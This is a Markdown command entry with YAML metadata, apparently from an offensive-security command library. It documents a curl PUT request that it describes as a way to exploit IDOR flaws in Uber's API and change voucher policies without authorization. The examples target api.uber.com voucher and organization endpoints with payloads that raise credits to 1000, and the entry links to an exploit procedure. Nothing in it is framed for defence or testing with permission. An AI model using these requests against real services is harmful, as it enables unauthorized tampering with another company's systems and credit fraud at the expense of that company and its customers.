---
id: c2d3e4f5-g6h7-8901-jklm-no5678901234
data: >-
  curl -H "Authorization: Bearer $TOKEN" -X PUT "$URL" -d '$PAYLOAD' -o
  response.json
tags:
  - api
  - modification
  - exploitation
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T12:00:00Z'
updated_at: '2025-12-14T17:25:17.734Z'
verified: false
validated: true
submitted: true
---
# curl-api-update

## Command

```bash
curl -H "Authorization: Bearer $TOKEN" -X PUT "$URL" -d '$PAYLOAD' -o response.json
```

## Description

This command performs an authenticated PUT request to update Uber API resources, ideal for IDOR-based policy modifications by altering IDs and payloads to change voucher settings unauthorizedly.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-H "Authorization: Bearer $TOKEN"` | Bearer token header | Yes |
| `-X PUT` | HTTP PUT method for updates | Yes |
| `$URL` | Endpoint URL with target IDs | Yes |
| `-d '$PAYLOAD'` | JSON payload for changes | Yes |
| `-o response.json` | Output file | No |

## Examples

### Basic Usage

```bash
curl -H "Authorization: Bearer YOUR_TOKEN" -X PUT "https://api.uber.com/v1/vouchers/123" -d '{"credits": 50}'
```

### Advanced Usage

```bash
curl -H "Authorization: Bearer YOUR_TOKEN" -X PUT "https://api.uber.com/v1/organizations/456/vouchers/789" -d '{"policy": {"credits": 1000}}' | jq '.'
```

## Expected Output

HTTP 200 with updated resource JSON, e.g., {"status": "updated", "policy": {"credits": 1000}}, or 403/404 on failure.

## Related

- [[Related Procedure: Exploit-IDOR-to-Modify-Voucher-Policies]]
